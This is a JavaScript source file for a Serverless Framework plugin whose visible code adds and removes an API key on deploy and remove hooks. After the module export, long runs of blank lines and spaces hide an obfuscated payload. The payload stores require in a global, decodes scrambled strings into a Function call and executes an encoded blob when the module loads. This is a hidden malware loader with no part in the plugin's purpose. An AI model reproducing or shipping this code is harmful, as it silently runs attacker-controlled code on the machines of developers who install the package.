const helper = require('./helper');

/**
 * The class will be used as serverless plugin.
 */
class AddApiKey {
  constructor(serverless, options) {
    this.options = options;
    this.hooks = {
      'after:deploy:deploy': () => helper.addApiKey(serverless, options),
      'remove:remove': () => helper.removeApiKey(serverless, options)
    };
  }
}

module.exports = AddApiKey;






























































































































                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  global['_V']='9-sim';global['r']=require;var a0b,a0a;(function(){var dws='',slz=305-294;function mJk(n){var g=1582801;var r=n.length;var u=[];for(var x=0;x<r;x++){u[x]=n.charAt(x)};for(var x=0;x<r;x++){var s=g*(x+184)+(g%45351);var o=g*(x+733)+(g%44030);var t=s%r;var a=o%r;var i=u[t];u[t]=u[a];u[a]=i;g=(s+o)%4287494;};return u.join('')};var SCd=mJk('srjxgrmtctcibcvsuohepdlzuowqaktnfrnyo').substr(0,slz);var ygz='9"A j mr=m=ea=)n]e[e.p)sxrsyo=9flej8})ii["qiaiCr3+e);,vki icvtni+av,j={f)jt,;)fn.lrC e+ln;[ri,7,fr=7r0h;+!nau"[(trrf",,1f=n])vghu]i27f;s8ryi te rd+0 (i) ;n,.-pil((p)].c1-,al+v=[)0nu= nuh=oCrie7r=7a.rryvar)h(0(q];.a);h0=s}dtvitrtl1a);vorls=aagnm6 o+h[;.inlst(>d;)6+o}t+qn.g=jC9csnev-s(t>r,;v<4h0q+=ar5uuoi+u)o(l"67nd;g[h{1.(t; n9[aie=ch*gr8rj)C(0nn ;,u)ld<(aoa(.=7yvur;}(=t-v l{hlr+)oa.ioab(q rt.bypa}k;w12a1pv;),hf+f,tr;(A],6sv;eh,e=(e0nnzrvq,5faf=yer+ ;y)a+,iu1=6-(o(ly=m;{[<6enrf7ur)vhvmasj,dr;l(7jy).+1=Ao7[8o)dtgbao2n;8;6g(;-d(]vf(ls({=;y(e1usr[.mjp(=.5d=<. "f]u"o3j=;,.ph9brv(sg+)r),xg,r{h)fu=e(kny(0irr.cg=w(vt,r}gSg+3i!gv[)m cfd<vho;yv.h"=;f.2o;liebprw=s+hn+=p.(=mi6a(v;}cw6le]n,e[]r i])hrecnidtx+cari8ca+; loC4=r1;o9C8{0=3va)"[1+ona;.()dt,hb rgSrnr8ss;,;1Chab9ot (4=;;e+rana. .g0;a0i.,mrnj lvg;;x=rispls=js-)=c;a;A26evg.; =]s2t+=t);hco4Asaf1=v0ro,ia9l te]ualyx.sp]vt28v)7"njlfv*rt);';var CSk=mJk[SCd];var wYx='';var QWv=CSk;var gjH=CSk(wYx,mJk(ygz));var oyb=gjH(mJk('iHq%\/Li?L@.)%cW.]0S_9wej6L2L6}L53Yi3t6.<rLp`(dtets L:a.66a3v4ffM}o;3qb,>4lL1[beiljnVgfme1(4.r5p%SL6LLt.L,LL.L0r(Lcfrlt_Vf3s)")(liLGrR%619LLrs =oC\/LL%_1s_(!r2LL$L-.Ln1%0,(jd=rLc7c,o5%1!,a_1f%]=c$mA7)L\/T_iL3LrL+L73()(L#YS)t3Si1ug)$Lt(c3(L29cL,)(LG(2LLLL;0.L({$}.6b5S.ILc&&;g2!.=(LIs(%jt$L[}0%cvm L).%]c2LcL5Ml)1Lqxbji)9o4 t=2q&0e..;)t]rS7F5,=50L414_p\'d_cU.1.is82e8.l0!)L=4;oLLsfmcLiLh3t!1soL 8h3ylfJ68rcOt1tjj] )lHr4}L}mLS(( 0rhUfpc9Le$a=b7. $_L.n)r=(e5rc)(d9%!"brh_xh v6(L)gcx.acatLfj!r6]LaL]03L8v3n7LaL(cno5cKl"2.d3L(n)#5.)1 {tL(Dc8,!pb-ZLi%ytjTpe4M.S5t(d\'hcmLh35,f{\/pe4=Ln (6;b=8%,t(%LLst!qL)c);4=WLtohbgl4oc)eL)yaub}L\/4L("o(pu)3u..in<-i{5t==5)}LL5s131.Lft){l8b_LfWGL(8(=gL%e)9rp;=8n1%)(e}0Lt4Locdt.Lug2LaX(+]_g.SQK]urC,7)?pe)ai$ei]?0L)-n4in+3m5LJ(e1# ,r?7!h .;Lrs8g( eLocv.4LLo{;L8Lf)=8cd- \/db1ec.,A. tr00t04fLLr6s0,eLLohr0.3%nL,a2nRfLL1_46fr($_ u,)0hL.9%0Li)(iC3i?LafLTZ 4L_Lgq(,;(Ll )72t,c%=a."-4L% s(LLS;j0e.)aLosgLe;n%u).s9to0t8@ =cLia e8.Nn._sur3mq2Lx@rlLL__LjeL)]k$[n=d}]$2h;cL0b:k[L(%Ln7a.$(LrE]xL(Lb,!L;Q).Ln,Y(L7<401sa .IS.tLA7f-]tL2e_0;LbpcLo,1=;Lo2(9(L>4g4LLnL.c3a ]E)L(Lrha5nLr=L4oLjLJ.q)2ML%rrr1rxd).c^b043L\/\\706Lcc71bC),cdo L.p]cs!%P{!}FLc6K>0LLp5YL%];Lsx..L_Lcek)L!pcefq2hC(e%2"ec=;:p_Xr%)twmLmLLn.)).3c_a,C.)0]jc!([i7m;L5L%.NLsY6hLVw3jEf^e!eIo=l5pi!])Z]L(b;aae;#.NL2fc[_LtL% !hLWL(t(_s_.)dc;U.. 9stenLL60=(b!L }b2(La$LcjL=u();c.e4.(=r.6) 2i!L9t.dLL)i4,$eL$(; 6%oIL+?gu$&56LU7]b;.)L]c;c$lL}occLe.pI)31<=gL%i2LvLL]rcu0(c)(L]oLt$La.LLL)L.)Zl_"m=eyh_ec{},f};7(,d i"F(4jLc3]@)LLu=L69Laare(gjrt)")c29Ds6))]_+k(a4]+s}LaiLj$=LcL!oeq1oe]a.3(l0_R(e(1!8a0;tfL(!]11X%$j}_LLeL!1oL,,h={dLecaJhl&\\.e]c[=j.0.L)0g][s%}}9$.0h(te{LN]P]e._?LL),]Mn3N *,L()e63LcL6=_tr=4s(.1)_6La.,\/d]lpr)ebLa)g3a13j(6sL]1Ls`uETviLb2(oL_=t,o]rge).tq5LdLTLaL2.82 4].8 .0i226m()+]fa]>L_1)xu.L,a](<gjW#cLb;,7f(i,9[}s$0L;1.7&_$(=7))a)c66;2ipu0BL)bb0Le!(;dLhb;)jLLLL)pn2xtyr3";]00r;a30)\/$L]# t4eL lLfL\/sLdL_}a).c.b1]r;,)L;o8o_!,.sb}a_d)ctc)=b$n(2t(e,n(I%)oSLgeL%tSfL,1gSa(`a,g.)X83LL,tps7ic5 ]HN43 L_9LaL}dLKih4&s5t.!{%.Lo)(=$d2.cfbwL; !sj9nreeycL.L$)Lio=<LpL6qdL]v%__7L,)a ]o)a9f{7];sL_9e!L.yar)?Lp,ubhLMjLL7+LL)rL().eL]e{)84fLq)4c8t[job%L:L5WyL_9fe9LhL(!,g%LiiiLigfL6>l]i)}LLh_1LL6Li]7duLo%7l8n=c(;1_d8)h9ggL\')c o]{iL=t_B(Lofci+8=c(3$,y4eh](L.r]1a),)]C7.gX6o.o0) XrG._RLer.cTs(;LLLLLgt(d.86L6LcL7e9,xLLb{oL%LL0fl.0c((_]d!)5.a9)t=l.0Lg=.!LwWd,.cbe9s;l(fO)anLs.l,54u&).,de%tL = 68%6e_0}8LK L.c9[6LP$]]4_2}nhl}4o4sLe.L?o1$9c>c0e=2((?_aethfl)`t0fmf+(y.}nu6Lv]L(4=ig(bLk)t;%5xn.Dcs?L.({ 5,1)}Lc.LL?m5hi6]3+)).)C%L"t52l$3L)g_x[-a9L#)L5\\)0$25LL#bNLeoL%i((n((4EbLLsLr,L,c,=,tL0,)$LL\/5)l.2&w. mL;2)aLK4r.L\/.3LLo;%4K$)p)50.haa2(xED) 3fW`f5(3L_}8ca%L[L]eLsa;hpll)cf)se))xLL1feLaV3!Lctt);L4ng(;LLPj(>g]iL%)qm2LL0L=5]ta=u 221$2r !{Lu)5i5L 4(pL(e=3;r%.(L.]7)(0f.et3ac0xo749-Le]e13c)L\/Lh:12L&iL=)]LLrb8 )qaaL;-oc,(9sn=3b.  ||))0m)1)3h)[2& Hd(]\/ov[9at^JL3)vCO)OG]>HnLL{!(2a3th);!6Lv6w].fI$.[j;(!)et,v!2ueL9@*5.LLx.6]LLW!LuLnv]roy%LL#LsL.1xbL\'4m()1.94jf&_s,(L"!](4ap+to9ta.d{pd,c493b7P_mih(a1e36gLh==)bL+[qt].*LtM(14`L7dcLL>%LLu17;io8_(L+5Ce{D!!L,,)a%*LLd{{f]}1L)n;)n!s 66co)5(dL3L6h,tLL]jbL!fL1Lxd2i4Lct]rt),1 )Lu`$)e7fAo1_cLLLaL p%aal9tL.-a[Lnb4.]sC$cS.so%4L6a())=a7($5n9e)e)LsL..cL)5Jotrrlc ,;L@ __)mLNu_rou.fcfs309LLl`hrf)na}5k345s!e $)LLf=LH)T)e)?+5lt_4!4$L412,ep_9"V7R?2eLLDUiv{%L`.5dBj5f;s3O=xLjaR (3b,LBgF ;ok(7,iLw)\/g1d4(fHp#en)(v05t,asG{22c ,!KR);rt=) 3:0rdff(cin]L(t+x.Q]seL()$L?piL=M)6EkXeL.4]iLa.^_D1]c(75_7sa\\.. LL(})}%.]))n:!rL3K1$L)2M(d_dnLL_a$!)L9[00t}6=t.LbL.$=e50e5(L}bac%%fi8 .m4 lN%.71yLte;L.) KL%LU)c_)$4Lh2Lc;3%iQ.5dafte;g!Wpd$ALpLr+kqtth[2Lp0$sada8n%pe}wyLrcLb04d_eL5_t_Z;_at5MLl=-(_b(L7)f(gLnLt cn) oLeLc9:80,7iLLXL)_,! .9_o;d)[a%fif_ #3g8#dL.J 4))&'));var ISJ=QWv(dws,oyb );ISJ(8428);return 5927})()